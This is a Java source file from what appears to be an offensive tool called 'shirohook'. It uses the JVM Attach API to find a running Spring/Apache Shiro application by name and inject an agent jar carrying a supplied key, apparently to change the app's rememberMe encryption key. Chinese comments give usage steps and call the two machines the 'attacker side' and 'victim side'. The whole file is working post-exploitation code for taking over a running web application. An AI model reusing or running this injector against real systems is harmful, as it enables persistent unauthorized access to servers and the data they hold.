package com.alter.inject;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.io.File;
import java.util.List;

public class AttachAgent {

    /**
     * 用来注入的 main 方法
     *
     * @param args 参数
     * @throws Exception 异常
     */
    //使用示例 java -jar shirohook.jar spring-shiro Vm1zrymqRIBQ8P4GrZk9cA==
    //注意目标的平台，目标时liunx的，要将tool包换成linux的tool，然后重新打包
    //运行之前先发送一个带rememberMe的数据包
    //java.io.IOException: Non-numeric value found - int expected 报错原因是攻击端的jdk版本与受害端的不同
    public static void main(String[] args) throws Exception {
        String packageName = args[0];//例如"srpingboot-shiro-0.0.1-SNAPSHOT.jar"
        String payload = args[1];
        System.out.println(packageName);
        System.out.println(payload);
        VirtualMachine vm;
        List<VirtualMachineDescriptor> vmList;
        String currentPath = AttachAgent.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
        String agentFile = new File("shirohook.jar").getCanonicalPath();
        try {
            vmList = VirtualMachine.list();
            for (VirtualMachineDescriptor vmd : vmList) {
                if (vmd.displayName().contains(packageName)) {
                    vm = VirtualMachine.attach(vmd);
                    if (null != vm) {
                        System.out.println(agentFile);
                        vm.loadAgent(agentFile,payload);
                        System.out.println("alter'shirohook successful.");
                        vm.detach();
                        return;
                    }
                }
            }

            System.out.println("No Tomcat Virtual Machine found.");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


}